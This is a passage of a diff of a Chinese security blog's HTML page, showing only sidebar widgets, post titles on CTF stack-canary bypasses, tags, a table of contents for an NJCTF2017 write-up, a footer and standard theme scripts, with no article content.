+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/15/Bypassing Canary——Override Canary in TLS/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Bypassing Canary——hijack __stack_chk_fail">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-15T07:44:12.000Z">2018-11-15</time></div>
+                    <a href="/2018/11/15/Bypassing Canary——Override Canary in TLS/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Bypassing Canary——hijack __stack_chk_fail</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/07/">
+                <span class="level-start">
+                    <span class="level-item">七月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/CTF/">
+                        <span class="tag">CTF</span>
+                        <span class="tag is-grey">6</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Canary/">
+                        <span class="tag">Canary</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Fortigate/">
+                        <span class="tag">Fortigate</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Linux/">
+                        <span class="tag">Linux</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/MISC/">
+                        <span class="tag">MISC</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/StackOverflow/">
+                        <span class="tag">StackOverflow</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Steganalysis/">
+                        <span class="tag">Steganalysis</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ghostscrpt/">
+                        <span class="tag">ghostscrpt</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/pwn/">
+                        <span class="tag">pwn</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/漏洞/">
+                        <span class="tag">漏洞</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/网络设备/">
+                        <span class="tag">网络设备</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/防火墙/">
+                        <span class="tag">防火墙</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right is-sticky">
+    
+        
+<div class="card widget" id="toc">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                目录
+            </h3>
+            <ul class="menu-list"><li>
+        <a class="is-flex" href="#NJCTF2017-messager">
+        <span class="has-mr-6">1</span>
+        <span>NJCTF2017 messager</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#分析">
+        <span class="has-mr-6">1.1</span>
+        <span>分析</span>
+        </a></li><li>
+        <a class="is-flex" href="#利用">
+        <span class="has-mr-6">1.2</span>
+        <span>利用</span>
+        </a></li></ul></li></ul>
+        </div>
+    </div>
+</div>
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/07/03/ghostscrpt/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Ghostscript-1.png" alt="CVE-2018-16509：Ghostscrpt沙箱绕过漏洞">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-07-03T15:55:26.000Z">2019-07-03</time></div>
+                    <a href="/2019/07/03/ghostscrpt/" class="title has-link-black-ter is-size-6 has-text-weight-normal">CVE-2018-16509：Ghostscrpt沙箱绕过漏洞</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/漏洞分析/">漏洞分析</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/07/03/hello-world/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Hello World">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-07-03T15:55:26.000Z">2019-07-03</time></div>
+                    <a href="/2019/07/03/hello-world/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Hello World</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/16/Bypassing Canary——SSP Leak/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Bypassing Canary——SSP Leak">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-16T05:05:12.000Z">2018-11-16</time></div>
+                    <a href="/2018/11/16/Bypassing Canary——SSP Leak/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Bypassing Canary——SSP Leak</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/15/Bypassing Canary——hijack __stack_chk_fail/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Bypassing Canary——hijack __stack_chk_fail">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-15T09:05:12.000Z">2018-11-15</time></div>
+                    <a href="/2018/11/15/Bypassing Canary——hijack __stack_chk_fail/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Bypassing Canary——hijack __stack_chk_fail</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/15/Bypassing Canary——Override Canary in TLS/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Bypassing Canary——hijack __stack_chk_fail">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-15T07:44:12.000Z">2018-11-15</time></div>
+                    <a href="/2018/11/15/Bypassing Canary——Override Canary in TLS/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Bypassing Canary——hijack __stack_chk_fail</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/07/">
+                <span class="level-start">
+                    <span class="level-item">七月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/CTF/">
+                        <span class="tag">CTF</span>
+                        <span class="tag is-grey">6</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Canary/">
+                        <span class="tag">Canary</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Fortigate/">
+                        <span class="tag">Fortigate</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Linux/">
+                        <span class="tag">Linux</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/MISC/">
+                        <span class="tag">MISC</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/StackOverflow/">
+                        <span class="tag">StackOverflow</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Steganalysis/">
+                        <span class="tag">Steganalysis</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ghostscrpt/">
+                        <span class="tag">ghostscrpt</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/pwn/">
+                        <span class="tag">pwn</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/漏洞/">
+                        <span class="tag">漏洞</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/网络设备/">
+                        <span class="tag">网络设备</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/防火墙/">
+                        <span class="tag">防火墙</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.svg" alt="Bypassing Canary——Brute force" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2019 John Doe&nbsp;
+                <!--Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>-->
+                
+                <br>
+                <span id="busuanzi_container_site_uv">
+                共<span id="busuanzi_value_site_uv">0</span>个访客
+                </span>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
